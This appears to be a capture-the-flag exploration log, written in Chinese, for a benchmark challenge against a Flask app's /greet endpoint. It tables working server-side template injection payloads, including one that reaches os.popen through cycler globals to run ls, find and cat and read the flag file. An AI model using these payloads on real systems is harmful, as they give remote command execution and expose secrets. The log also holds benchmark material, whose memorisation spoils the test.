# xben-076-24 · 探索记录

对应题解：[`xben-076-24.md`](./xben-076-24.md)

## 目标与起点

`10.0.172.219:5000`，Flask 3.0.3 + Python 3.9.25，`/greet?name=`。

## 第一阶段：确认 SSTI

| payload | 结果 |
| --- | --- |
| `{{7*7}}` | `Hello, 49!` |
| `{{config}}` | 打印 Flask 配置（SECRET_KEY 为 None） |
| `{{FLAG}}` / `{{flag}}` | 空 |

## 第二阶段：RCE 与定位 flag

| payload | 结果 |
| --- | --- |
| `cycler.__init__.__globals__.os.popen('cat /flag.txt').read()` | 空 |
| `...popen('ls /')` | 列出 `app`、`etc`…（无 flag） |
| `...popen('find / -maxdepth 3 -iname "*flag*"')` | 命中 `/tmp/flag` |
| `...popen('cat /tmp/flag')` | **flag** |

## 这次真正的收获

SSTI 定性一次成功后，直接用 `find` 找 flag，比逐个猜路径省事。
